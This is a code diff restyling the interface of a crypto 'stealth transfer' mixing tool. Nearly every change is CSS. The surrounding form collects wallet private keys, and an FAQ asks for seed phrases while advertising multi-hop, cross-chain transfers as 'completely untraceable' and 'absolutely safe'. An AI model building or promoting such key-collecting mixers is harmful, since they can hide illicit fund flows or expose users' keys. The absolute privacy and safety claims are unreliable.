@@ -260,14 +260,14 @@ function StealthTransferApp() {
   };
 
   return (
-    <div className="bg-white rounded-xl shadow-lg p-6">
+    <div className="bg-[#1a1a1a] border border-[#d4af37]/20 rounded-xl shadow-2xl shadow-[#d4af37]/5 p-6">
       {/* Online Users Display */}
-      <div className="mb-4 flex items-center justify-between bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-lg px-4 py-2">
+      <div className="mb-4 flex items-center justify-between bg-[#0a0a0a] border border-[#10b981]/30 rounded-lg px-4 py-2">
         <div className="flex items-center space-x-2">
-          <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
-          <span className="text-sm text-gray-700">今日在线</span>
+          <div className="w-2 h-2 bg-[#10b981] rounded-full animate-pulse shadow-lg shadow-[#10b981]/50"></div>
+          <span className="text-sm text-gray-400">今日在线</span>
         </div>
-        <span className="text-lg font-bold text-green-600">{onlineUsers}</span>
+        <span className="text-lg font-bold text-[#10b981]">{onlineUsers}</span>
       </div>
       
       {/* Mixing Mode Selection */}
@@ -276,20 +276,20 @@ function StealthTransferApp() {
           {/* 快速模式 */}
           <button
             onClick={() => setMode('fast')}
-            className={`relative p-5 rounded-xl transition-all duration-300 overflow-hidden group ${
+            className={`relative p-5 rounded-xl transition-all duration-300 overflow-hidden group border ${
               mode === 'fast'
-                ? "bg-gradient-to-br from-blue-500 to-blue-600 shadow-lg shadow-blue-500/50"
-                : "bg-gradient-to-br from-blue-400 to-blue-500 hover:shadow-lg hover:shadow-blue-400/40 hover:-translate-y-0.5"
+                ? "bg-gradient-to-br from-[#d4af37]/20 to-[#ffd700]/10 border-[#d4af37] shadow-xl shadow-[#d4af37]/30"
+                : "bg-[#0a0a0a] border-[#d4af37]/20 hover:border-[#d4af37]/50 hover:shadow-lg hover:shadow-[#d4af37]/20"
             }`}
           >
             {/* 发光效果 */}
-            <div className={`absolute inset-0 bg-gradient-to-r from-transparent via-white to-transparent opacity-0 group-hover:opacity-20 transition-opacity duration-500 ${
-              mode === 'fast' ? 'opacity-10' : ''
+            <div className={`absolute inset-0 bg-gradient-to-r from-transparent via-[#d4af37]/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 ${
+              mode === 'fast' ? 'opacity-30' : ''
             }`}></div>
             
             <div className="relative z-10">
-              <div className="font-bold text-base mb-2 text-white">快速模式</div>
-              <div className="text-xs text-blue-50 leading-relaxed">
+              <div className={`font-bold text-base mb-2 ${mode === 'fast' ? 'text-[#d4af37]' : 'text-white'}`}>快速模式</div>
+              <div className={`text-xs leading-relaxed ${mode === 'fast' ? 'text-[#d4af37]/80' : 'text-gray-400'}`}>
                 交叉混淆 · 隐藏IP · 快速到账
               </div>
             </div>
@@ -298,20 +298,20 @@ function StealthTransferApp() {
           {/* 极致隐私 */}
           <button
             onClick={() => setMode('ultimate')}
-            className={`relative p-5 rounded-xl transition-all duration-300 overflow-hidden group ${
+            className={`relative p-5 rounded-xl transition-all duration-300 overflow-hidden group border ${
               mode === 'ultimate'
-                ? "bg-gradient-to-br from-purple-900 via-purple-800 to-black shadow-lg shadow-purple-900/50"
-                : "bg-gradient-to-br from-purple-800 via-purple-700 to-gray-900 hover:shadow-lg hover:shadow-purple-800/40 hover:-translate-y-0.5"
+                ? "bg-gradient-to-br from-[#d4af37]/20 to-[#ffd700]/10 border-[#d4af37] shadow-xl shadow-[#d4af37]/30"
+                : "bg-[#0a0a0a] border-[#d4af37]/20 hover:border-[#d4af37]/50 hover:shadow-lg hover:shadow-[#d4af37]/20"
             }`}
           >
             {/* 发光效果 */}
-            <div className={`absolute inset-0 bg-gradient-to-r from-transparent via-purple-300 to-transparent opacity-0 group-hover:opacity-20 transition-opacity duration-500 ${
-              mode === 'ultimate' ? 'opacity-10' : ''
+            <div className={`absolute inset-0 bg-gradient-to-r from-transparent via-[#d4af37]/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 ${
+              mode === 'ultimate' ? 'opacity-30' : ''
             }`}></div>
             
             <div className="relative z-10">
-              <div className="font-bold text-base mb-2 text-white">极致隐私</div>
-              <div className="text-xs text-purple-100 leading-relaxed">
+              <div className={`font-bold text-base mb-2 ${mode === 'ultimate' ? 'text-[#d4af37]' : 'text-white'}`}>极致隐私</div>
+              <div className={`text-xs leading-relaxed ${mode === 'ultimate' ? 'text-[#d4af37]/80' : 'text-gray-400'}`}>
                 多链幽灵模式 · 完全匿名 · 无法追踪
               </div>
             </div>
@@ -320,17 +320,17 @@ function StealthTransferApp() {
         
         {/* Mode Description */}
         {mode === 'fast' && (
-          <div className="mt-4 p-4 bg-blue-50 border border-blue-200 rounded-lg">
-            <p className="text-sm text-blue-900 leading-relaxed">
-              <span className="font-semibold">单链混币</span> · 建议使用VPN保护IP · 适合小额转账（&lt;0.5 BNB）
+          <div className="mt-4 p-4 bg-[#0a0a0a] border border-[#d4af37]/30 rounded-lg shadow-lg shadow-[#d4af37]/10">
+            <p className="text-sm text-gray-300 leading-relaxed">
+              <span className="font-semibold text-[#d4af37]">单链混币</span> · 建议使用VPN保护IP · 适合小额转账（&lt;0.5 BNB）
             </p>
           </div>
         )}
         
         {mode === 'ultimate' && (
-          <div className="mt-4 p-4 bg-purple-50 border border-purple-200 rounded-lg">
-            <p className="text-sm text-purple-900 leading-relaxed">
-              适合大额转账，N次交叉转账+多链路径+100%隐藏资金路径，IP无法追踪，绝对安全保护隐私
+          <div className="mt-4 p-4 bg-[#0a0a0a] border border-[#d4af37]/30 rounded-lg shadow-lg shadow-[#d4af37]/10">
+            <p className="text-sm text-gray-300 leading-relaxed">
+              <span className="font-semibold text-[#d4af37]">适合大额转账</span>，N次交叉转账+多链路径+100%隐藏资金路径，IP无法追踪，绝对安全保护隐私
             </p>
           </div>
         )}
@@ -338,22 +338,22 @@ function StealthTransferApp() {
       
       {/* Chain Selection */}
       <div className="mb-4">
-        <label className="block text-sm font-medium text-gray-700 mb-2">
+        <label className="block text-sm font-medium text-white mb-2">
           选择网络
         </label>
         <select
           value={chain}
           onChange={(e) => setChain(e.target.value)}
-          className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
+          className="w-full px-4 py-2 bg-[#0a0a0a] border-b-2 border-[#d4af37]/50 text-white rounded-lg focus:ring-2 focus:ring-[#d4af37] focus:border-[#d4af37] transition-all"
         >
-          <option value="bsc">BSC</option>
-          <option value="eth">Ethereum</option>
+          <option value="bsc" className="bg-[#0a0a0a]">BSC</option>
+          <option value="eth" className="bg-[#0a0a0a]">Ethereum</option>
         </select>
       </div>
 
       {/* Private Key */}
       <div className="mb-4">
-        <label className="block text-sm font-medium text-gray-700 mb-2">
+        <label className="block text-sm font-medium text-white mb-2">
           源地址私钥 *
         </label>
         <input
@@ -361,13 +361,13 @@ function StealthTransferApp() {
           value={privateKey}
           onChange={(e) => setPrivateKey(e.target.value)}
           placeholder="输入私钥"
-          className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent text-sm"
+          className="w-full px-4 py-2 bg-[#0a0a0a] border-b-2 border-[#d4af37]/50 text-white placeholder-gray-500 rounded-lg focus:ring-2 focus:ring-[#d4af37] focus:border-[#d4af37] transition-all text-sm"
         />
       </div>
 
       {/* Target Address */}
       <div className="mb-4">
-        <label className="block text-sm font-medium text-gray-700 mb-2">
+        <label className="block text-sm font-medium text-white mb-2">
           目标地址 *
         </label>
         <input
@@ -375,13 +375,13 @@ function StealthTransferApp() {
           value={toAddress}
           onChange={(e) => setToAddress(e.target.value)}
           placeholder="0x..."
-          className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent text-sm"
+          className="w-full px-4 py-2 bg-[#0a0a0a] border-b-2 border-[#d4af37]/50 text-white placeholder-gray-500 rounded-lg focus:ring-2 focus:ring-[#d4af37] focus:border-[#d4af37] transition-all text-sm"
         />
       </div>
 
       {/* Amount */}
       <div className="mb-4">
-        <label className="block text-sm font-medium text-gray-700 mb-2">
+        <label className="block text-sm font-medium text-white mb-2">
           转账金额 (BNB) *
         </label>
         <input
@@ -390,19 +390,19 @@ function StealthTransferApp() {
           value={amount}
           onChange={(e) => setAmount(e.target.value)}
           placeholder="0.1"
-          className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent text-sm"
+          className="w-full px-4 py-2 bg-[#0a0a0a] border-b-2 border-[#d4af37]/50 text-white placeholder-gray-500 rounded-lg focus:ring-2 focus:ring-[#d4af37] focus:border-[#d4af37] transition-all text-sm"
         />
       </div>
 
       {/* Number of Hops */}
       <div className="mb-4">
-        <label className="block text-sm font-medium text-gray-700 mb-2">
-          跳数: {numHops} <span className="text-xs text-gray-500">(越多越隐秘)</span>
-          <span className="ml-2 text-xs text-blue-600">
+        <label className="block text-sm font-medium text-white mb-2">
+          跳数: <span className="text-[#d4af37]">{numHops}</span> <span className="text-xs text-gray-400">(越多越隐秘)</span>
+          <span className="ml-2 text-xs text-[#d4af37]">
             预计 {numHops <= 10 ? '~30秒' : numHops <= 50 ? '~2.5分钟' : numHops <= 100 ? '~5分钟' : '~20分钟'}
           </span>
         </label>
-        <p className="text-xs text-gray-600 mb-2">多个中转钱包地址，隐藏转账路径，实现隐匿转账，确保资金的隐私。</p>
+        <p className="text-xs text-gray-400 mb-2">多个中转钱包地址，隐藏转账路径，实现隐匿转账，确保资金的隐私。</p>
         <div className="flex gap-2">
           {[10, 50, 100, 500, 1000].map((num) => (
             <button
@@ -411,10 +411,10 @@ function StealthTransferApp() {
                 setNumHops(num);
                 setCustomHops("");
               }}
-              className={`px-3 py-1 rounded-lg font-medium transition text-sm ${
+              className={`px-3 py-1 rounded-lg font-medium transition text-sm border ${
                 numHops === num && customHops === ""
-                  ? "bg-purple-600 text-white"
-                  : "bg-gray-100 text-gray-700 hover:bg-gray-200"
+                  ? "bg-gradient-to-r from-[#d4af37] to-[#ffd700] text-black border-[#d4af37] shadow-lg shadow-[#d4af37]/30"
+                  : "bg-[#0a0a0a] text-gray-300 border-[#d4af37]/30 hover:border-[#d4af37] hover:shadow-md hover:shadow-[#d4af37]/20"
               }`}
             >
               {num}
@@ -434,37 +434,37 @@ function StealthTransferApp() {
                 setNumHops(num);
               }
             }}
-            className="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent text-sm"
+            className="flex-1 px-4 py-2 bg-[#0a0a0a] border-b-2 border-[#d4af37]/50 text-white placeholder-gray-500 rounded-lg focus:ring-2 focus:ring-[#d4af37] focus:border-[#d4af37] transition-all text-sm"
             placeholder="自定义"
           />
         </div>
       </div>
       {/* Fee Estimate */}
-      <div className="bg-gray-50 p-4 rounded-lg mb-4">
+      <div className="bg-[#0a0a0a] border border-[#d4af37]/30 p-4 rounded-lg mb-4 shadow-lg shadow-[#d4af37]/10">
         <div className="grid grid-cols-2 gap-3 text-sm">
           <div>
-            <p className="text-gray-600 text-xs">服务费</p>
-            <p className="font-semibold">
+            <p className="text-gray-400 text-xs">服务费</p>
+            <p className="font-semibold text-[#d4af37]">
               {mode === 'ultimate' && amount
                 ? (parseFloat(amount) * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.percentageFee || 0) / 100).toFixed(4)
                 : (numHops * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.feeRate || 0.0003)).toFixed(4)} BNB
             </p>
           </div>
           <div>
-            <p className="text-gray-600 text-xs">预估 Gas</p>
-            <p className="font-semibold">~{(numHops * 0.00021).toFixed(5)} BNB</p>
+            <p className="text-gray-400 text-xs">预估 Gas</p>
+            <p className="font-semibold text-[#d4af37]">~{(numHops * 0.00021).toFixed(5)} BNB</p>
           </div>
           {mode === 'ultimate' && (
             <div>
-              <p className="text-gray-600 text-xs">跨链费用</p>
-              <p className="font-semibold text-orange-600">
+              <p className="text-gray-400 text-xs">跨链费用</p>
+              <p className="font-semibold text-[#ffa500]">
                 ~{MIXING_MODES[mode as keyof typeof MIXING_MODES]?.crosschainFee || 0} BNB
               </p>
             </div>
           )}
           <div>
-            <p className="text-gray-600 text-xs">总费用</p>
-            <p className="font-semibold text-purple-600">
+            <p className="text-gray-400 text-xs">总费用</p>
+            <p className="font-semibold text-[#d4af37]">
               ~{mode === 'ultimate' && amount
                 ? ((parseFloat(amount) * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.percentageFee || 0) / 100) + 
                    numHops * 0.00021 + 
@@ -475,8 +475,8 @@ function StealthTransferApp() {
             </p>
           </div>
           <div>
-            <p className="text-gray-600 text-xs">预计收到</p>
-            <p className="font-semibold text-green-600">
+            <p className="text-gray-400 text-xs">预计收到</p>
+            <p className="font-semibold text-[#10b981]">
               {amount ? (
                 mode === 'ultimate'
                   ? (parseFloat(amount) - 
@@ -497,44 +497,49 @@ function StealthTransferApp() {
       <button
         onClick={handleExecute}
         disabled={isLoading || !privateKey || !toAddress || !amount}
-        className={`w-full py-4 rounded-lg font-semibold transition-all duration-300 relative overflow-hidden ${
+        className={`w-full py-6 rounded-lg font-bold text-lg transition-all duration-300 relative overflow-hidden ${
           isLoading || !privateKey || !toAddress || !amount
-            ? "bg-gray-300 text-gray-500 cursor-not-allowed"
-            : "bg-gradient-to-r from-purple-600 to-purple-700 text-white hover:from-purple-700 hover:to-purple-800 shadow-lg hover:shadow-xl"
+            ? "bg-gray-700 text-gray-500 cursor-not-allowed border border-gray-600"
+            : "bg-gradient-to-r from-[#d4af37] via-[#ffd700] to-[#d4af37] text-black hover:shadow-2xl hover:shadow-[#d4af37]/50 border-2 border-[#d4af37] shadow-xl shadow-[#d4af37]/30"
         }`}
       >
+        {/* 发光动画效果 */}
+        {!isLoading && privateKey && toAddress && amount && (
+          <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer"></div>
+        )}
+        
         {isLoading ? (
           <div className="relative z-10">
             <div className="flex items-center justify-center mb-2">
-              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
+              <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-black mr-2"></div>
               <span>处理中 {progressPercent}%</span>
             </div>
             {/* Progress Bar */}
-            <div className="absolute bottom-0 left-0 right-0 h-1 bg-purple-900/30">
+            <div className="absolute bottom-0 left-0 right-0 h-2 bg-black/30 rounded-b-lg overflow-hidden">
               <div 
-                className="h-full bg-gradient-to-r from-green-400 to-green-500 transition-all duration-500 ease-out"
+                className="h-full bg-gradient-to-r from-[#d4af37] to-[#ffd700] transition-all duration-500 ease-out shadow-lg shadow-[#d4af37]/50"
                 style={{ width: `${progressPercent}%` }}
               ></div>
             </div>
           </div>
         ) : (
-          "安全转移"
+          <span className="relative z-10">安全转移</span>
         )}
       </button>
 
       {/* FAQ Section */}
       <div className="mt-6">
-        <h3 className="text-sm font-semibold text-gray-700 mb-3">常见问题</h3>
+        <h3 className="text-sm font-semibold text-[#d4af37] mb-3 border-b border-[#d4af37]/30 pb-2">常见问题</h3>
         <div className="space-y-2">
           {/* FAQ 1 */}
-          <div className="border border-gray-200 rounded-lg overflow-hidden">
+          <div className="border border-[#d4af37]/20 rounded-lg overflow-hidden bg-[#0a0a0a]">
             <button
               onClick={() => setExpandedFaq(expandedFaq === 1 ? null : 1)}
-              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-gray-50 transition"
+              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-[#1a1a1a] transition border-l-2 border-l-[#d4af37]/50"
             >
-              <span className="text-sm font-medium text-gray-800">如何确保转账完全无法被追踪？</span>
+              <span className="text-sm font-medium text-white">如何确保转账完全无法被追踪？</span>
               <svg
-                className={`w-5 h-5 text-gray-500 transition-transform ${expandedFaq === 1 ? 'rotate-180' : ''}`}
+                className={`w-5 h-5 text-[#d4af37] transition-transform ${expandedFaq === 1 ? 'rotate-180' : ''}`}
                 fill="none"
                 stroke="currentColor"
                 viewBox="0 0 24 24"
@@ -543,7 +548,7 @@ function StealthTransferApp() {
               </svg>
             </button>
             {expandedFaq === 1 && (
-              <div className="px-4 py-3 bg-gray-50 text-xs text-gray-700 leading-relaxed border-t border-gray-200">
+              <div className="px-4 py-3 bg-[#1a1a1a] text-xs text-gray-300 leading-relaxed border-t border-[#d4af37]/20">
                 <p className="font-semibold mb-2">技术原理：</p>
                 <p className="mb-3">我们采用<strong>多层隔离架构</strong>，从技术层面彻底切断资金链追溯：</p>
                 
@@ -575,14 +580,14 @@ function StealthTransferApp() {
           </div>
 
           {/* FAQ 2 */}
-          <div className="border border-gray-200 rounded-lg overflow-hidden">
+          <div className="border border-[#d4af37]/20 rounded-lg overflow-hidden bg-[#0a0a0a]">
             <button
               onClick={() => setExpandedFaq(expandedFaq === 2 ? null : 2)}
-              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-gray-50 transition"
+              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-[#1a1a1a] transition border-l-2 border-l-[#d4af37]/50"
             >
-              <span className="text-sm font-medium text-gray-800">资金安全性如何保障？会不会被盗或丢失？</span>
+              <span className="text-sm font-medium text-white">资金安全性如何保障？会不会被盗或丢失？</span>
               <svg
-                className={`w-5 h-5 text-gray-500 transition-transform ${expandedFaq === 2 ? 'rotate-180' : ''}`}
+                className={`w-5 h-5 text-[#d4af37] transition-transform ${expandedFaq === 2 ? 'rotate-180' : ''}`}
                 fill="none"
                 stroke="currentColor"
                 viewBox="0 0 24 24"
@@ -591,7 +596,7 @@ function StealthTransferApp() {
               </svg>
             </button>
             {expandedFaq === 2 && (
-              <div className="px-4 py-3 bg-gray-50 text-xs text-gray-700 leading-relaxed border-t border-gray-200">
+              <div className="px-4 py-3 bg-[#1a1a1a] text-xs text-gray-300 leading-relaxed border-t border-[#d4af37]/20">
                 <p className="font-semibold mb-2">去中心化架构保障：</p>
                 
                 <p className="font-semibold text-green-700 mb-1">✅ 非托管设计</p>
@@ -626,14 +631,14 @@ function StealthTransferApp() {
           </div>
 
           {/* FAQ 3 */}
-          <div className="border border-gray-200 rounded-lg overflow-hidden">
+          <div className="border border-[#d4af37]/20 rounded-lg overflow-hidden bg-[#0a0a0a]">
             <button
               onClick={() => setExpandedFaq(expandedFaq === 3 ? null : 3)}
-              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-gray-50 transition"
+              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-[#1a1a1a] transition border-l-2 border-l-[#d4af37]/50"
             >
-              <span className="text-sm font-medium text-gray-800">两种模式的隐私保护有什么本质区别？</span>
+              <span className="text-sm font-medium text-white">两种模式的隐私保护有什么本质区别？</span>
               <svg
-                className={`w-5 h-5 text-gray-500 transition-transform ${expandedFaq === 3 ? 'rotate-180' : ''}`}
+                className={`w-5 h-5 text-[#d4af37] transition-transform ${expandedFaq === 3 ? 'rotate-180' : ''}`}
                 fill="none"
                 stroke="currentColor"
                 viewBox="0 0 24 24"
@@ -642,7 +647,7 @@ function StealthTransferApp() {
               </svg>
             </button>
             {expandedFaq === 3 && (
-              <div className="px-4 py-3 bg-gray-50 text-xs text-gray-700 leading-relaxed border-t border-gray-200">
+              <div className="px-4 py-3 bg-[#1a1a1a] text-xs text-gray-300 leading-relaxed border-t border-[#d4af37]/20">
                 <p className="font-semibold mb-2">快速模式 - 单链深度混淆：</p>
                 <p className="mb-1"><strong>适用场景：</strong>日常转账、小额资金（&lt;0.5 BNB）、需要快速到账（30秒-5分钟）</p>
                 <p className="mb-1"><strong>技术特点：</strong>双层隔离 + 多跳混币，10-100个中转地址随机跳转</p>
@@ -666,14 +671,14 @@ function StealthTransferApp() {
           </div>
 
           {/* FAQ 4 */}
-          <div className="border border-gray-200 rounded-lg overflow-hidden">
+          <div className="border border-[#d4af37]/20 rounded-lg overflow-hidden bg-[#0a0a0a]">
             <button
               onClick={() => setExpandedFaq(expandedFaq === 4 ? null : 4)}
-              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-gray-50 transition"
+              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-[#1a1a1a] transition border-l-2 border-l-[#d4af37]/50"
             >
-              <span className="text-sm font-medium text-gray-800">为什么需要提供助记词？安全吗？</span>
+              <span className="text-sm font-medium text-white">为什么需要提供助记词？安全吗？</span>
               <svg
-                className={`w-5 h-5 text-gray-500 transition-transform ${expandedFaq === 4 ? 'rotate-180' : ''}`}
+                className={`w-5 h-5 text-[#d4af37] transition-transform ${expandedFaq === 4 ? 'rotate-180' : ''}`}
                 fill="none"
                 stroke="currentColor"
                 viewBox="0 0 24 24"
@@ -682,7 +687,7 @@ function StealthTransferApp() {
               </svg>
             </button>
             {expandedFaq === 4 && (
-              <div className="px-4 py-3 bg-gray-50 text-xs text-gray-700 leading-relaxed border-t border-gray-200">
+              <div className="px-4 py-3 bg-[#1a1a1a] text-xs text-gray-300 leading-relaxed border-t border-[#d4af37]/20">
                 <p className="font-semibold mb-2">技术必要性：</p>
                 <p className="mb-1"><strong>HD钱包原理：</strong></p>
                 <ul className="list-disc list-inside mb-3 space-y-1 ml-2">
@@ -724,14 +729,14 @@ function StealthTransferApp() {
           </div>
 
           {/* FAQ 5 */}
-          <div className="border border-gray-200 rounded-lg overflow-hidden">
+          <div className="border border-[#d4af37]/20 rounded-lg overflow-hidden bg-[#0a0a0a]">
             <button
               onClick={() => setExpandedFaq(expandedFaq === 5 ? null : 5)}
-              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-gray-50 transition"
+              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-[#1a1a1a] transition border-l-2 border-l-[#d4af37]/50"
             >
-              <span className="text-sm font-medium text-gray-800">如果交易失败或卡住怎么办？</span>
+              <span className="text-sm font-medium text-white">如果交易失败或卡住怎么办？</span>
               <svg
-                className={`w-5 h-5 text-gray-500 transition-transform ${expandedFaq === 5 ? 'rotate-180' : ''}`}
+                className={`w-5 h-5 text-[#d4af37] transition-transform ${expandedFaq === 5 ? 'rotate-180' : ''}`}
                 fill="none"
                 stroke="currentColor"
                 viewBox="0 0 24 24"
@@ -740,7 +745,7 @@ function StealthTransferApp() {
               </svg>
             </button>
             {expandedFaq === 5 && (
-              <div className="px-4 py-3 bg-gray-50 text-xs text-gray-700 leading-relaxed border-t border-gray-200">
+              <div className="px-4 py-3 bg-[#1a1a1a] text-xs text-gray-300 leading-relaxed border-t border-[#d4af37]/20">
                 <p className="font-semibold mb-2">容错机制：</p>
                 
                 <p className="font-semibold text-green-700 mb-1">✅ 自动重试</p>
@@ -781,7 +786,7 @@ function StealthTransferApp() {
 
       {/* Progress Display */}
       {progress.length > 0 && (
-        <div className="mt-4 bg-gray-900 text-green-400 p-3 rounded-lg font-mono text-xs max-h-64 overflow-y-auto">
+        <div className="mt-4 bg-[#0a0a0a] border border-[#d4af37]/30 text-[#d4af37] p-3 rounded-lg font-mono text-xs max-h-64 overflow-y-auto shadow-lg shadow-[#d4af37]/10">
           {progress.map((line, index) => (
             <div key={index} className="whitespace-pre-wrap">
               {line}
@@ -789,7 +794,7 @@ function StealthTransferApp() {
           ))}
           {isLoading && (
             <div className="mt-2 flex items-center text-xs">
-              <div className="animate-spin rounded-full h-3 w-3 border-b-2 border-green-400 mr-2"></div>
+              <div className="animate-spin rounded-full h-3 w-3 border-b-2 border-[#d4af37] mr-2"></div>
               <span>处理中...</span>
             </div>
           )}
@@ -798,11 +803,11 @@ function StealthTransferApp() {
 
       {/* Result - Only show on error */}
       {result && !result.success && (
-        <div className="mt-4 p-4 rounded-lg text-sm bg-red-50 border border-red-200">
-          <h3 className="font-semibold mb-2 text-red-800">
+        <div className="mt-4 p-4 rounded-lg text-sm bg-red-900/20 border border-red-500/30">
+          <h3 className="font-semibold mb-2 text-red-400">
             ❌ 执行失败
           </h3>
-          <p className="text-xs text-red-700">{result.error}</p>
+          <p className="text-xs text-red-300">{result.error}</p>
         </div>
       )}
     </div>
@@ -850,19 +855,19 @@ export default function Home() {
   }, []);
 
   return (
-    <div className="min-h-screen bg-gray-50">
+    <div className="min-h-screen bg-[#0a0a0a]">
       {/* Header */}
-      <header className="bg-white shadow-sm border-b sticky top-0 z-10">
+      <header className="bg-[#0a0a0a] border-b border-[#d4af37]/20 sticky top-0 z-10 backdrop-blur-sm">
         <nav className="container mx-auto px-6 py-4">
           <div className="flex items-center justify-between">
             <div className="flex items-center space-x-3">
               <img src="/logo.png" alt="CYGJ Logo" className="w-10 h-10" />
-              <span className="text-2xl font-bold text-gray-800">CYGJ Crypto Tools</span>
+              <span className="text-2xl font-bold text-white">CYGJ Crypto Tools</span>
             </div>
             <div className="hidden md:flex space-x-6">
-              <a href="#" className="text-gray-600 hover:text-purple-600">工具</a>
-              <a href="#" className="text-gray-600 hover:text-purple-600">文档</a>
-              <a href="#" className="text-gray-600 hover:text-purple-600">关于</a>
+              <a href="#" className="text-gray-400 hover:text-[#d4af37] transition">工具</a>
+              <a href="#" className="text-gray-400 hover:text-[#d4af37] transition">文档</a>
+              <a href="#" className="text-gray-400 hover:text-[#d4af37] transition">关于</a>
             </div>
           </div>
         </nav>
@@ -872,25 +877,27 @@ export default function Home() {
         <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
           {/* Left Sidebar - Tool List */}
           <div className="lg:col-span-1">
-            <div className="bg-white rounded-xl shadow-lg p-4 sticky top-24">
-              <h2 className="text-lg font-bold mb-4 text-gray-800">工具列表</h2>
+            <div className="bg-[#1a1a1a] border border-[#d4af37]/20 rounded-xl p-4 sticky top-24">
+              <h2 className="text-lg font-bold mb-4 text-[#d4af37]">工具列表</h2>
               <div className="space-y-2">
                 {tools.map((tool) => (
                   <button
                     key={tool.id}
                     onClick={() => setSelectedTool(tool)}
-                    className={`w-full text-left p-3 rounded-lg transition ${
+                    className={`w-full text-left p-3 rounded-lg transition-all duration-300 ${
                       selectedTool.id === tool.id
-                        ? "bg-purple-600 text-white"
-                        : "bg-gray-50 text-gray-700 hover:bg-gray-100"
+                        ? "bg-gradient-to-r from-[#d4af37]/20 to-[#ffd700]/10 border border-[#d4af37] shadow-lg shadow-[#d4af37]/20"
+                        : "bg-[#0a0a0a] border border-[#d4af37]/10 hover:border-[#d4af37]/30 hover:shadow-md hover:shadow-[#d4af37]/10"
                     }`}
                   >
                     <div className="flex items-center space-x-3">
                       <span className="text-2xl">{tool.icon}</span>
                       <div className="flex-1 min-w-0">
-                        <p className="font-semibold text-sm truncate">{tool.name}</p>
+                        <p className={`font-semibold text-sm truncate ${
+                          selectedTool.id === tool.id ? "text-[#d4af37]" : "text-white"
+                        }`}>{tool.name}</p>
                         <p className={`text-xs truncate ${
-                          selectedTool.id === tool.id ? "text-purple-100" : "text-gray-500"
+                          selectedTool.id === tool.id ? "text-[#d4af37]/70" : "text-gray-500"
                         }`}>
                           {tool.category === "privacy" ? "隐私工具" : 
                            tool.category === "wallet" ? "钱包工具" :
@@ -898,7 +905,7 @@ export default function Home() {
                         </p>
                       </div>
                       {tool.status === "active" && (
-                        <span className="flex-shrink-0 w-2 h-2 bg-green-400 rounded-full"></span>
+                        <span className="flex-shrink-0 w-2 h-2 bg-[#10b981] rounded-full shadow-lg shadow-[#10b981]/50"></span>
                       )}
                     </div>
                   </button>
@@ -906,23 +913,23 @@ export default function Home() {
               </div>
 
               {/* Tool Info */}
-              <div className="mt-6 pt-6 border-t">
+              <div className="mt-6 pt-6 border-t border-[#d4af37]/20">
                 <div className="text-center mb-4">
                   <div className="text-4xl mb-2">{selectedTool.icon}</div>
-                  <h3 className="font-bold text-sm">{selectedTool.name}</h3>
-                  <p className="text-xs text-gray-600 mt-1">{selectedTool.description}</p>
+                  <h3 className="font-bold text-sm text-white">{selectedTool.name}</h3>
+                  <p className="text-xs text-gray-400 mt-1">{selectedTool.description}</p>
                 </div>
 
                 {selectedTool.status === "active" && (
                   <>
                     <div className="grid grid-cols-2 gap-2 mb-4">
-                      <div className="bg-purple-50 p-2 rounded text-center">
-                        <div className="text-lg font-bold text-purple-600">{dailyUsage}</div>
-                        <div className="text-xs text-gray-600">今日使用</div>
+                      <div className="bg-[#0a0a0a] border border-[#d4af37]/20 p-2 rounded text-center">
+                        <div className="text-lg font-bold text-[#d4af37]">{dailyUsage}</div>
+                        <div className="text-xs text-gray-400">今日使用</div>
                       </div>
-                      <div className="bg-green-50 p-2 rounded text-center">
-                        <div className="text-lg font-bold text-green-600">{selectedTool.users}</div>
-                        <div className="text-xs text-gray-600">总用户</div>
+                      <div className="bg-[#0a0a0a] border border-[#10b981]/20 p-2 rounded text-center">
+                        <div className="text-lg font-bold text-[#10b981]">{selectedTool.users}</div>
+                        <div className="text-xs text-gray-400">总用户</div>
                       </div>
                     </div>
                   </>
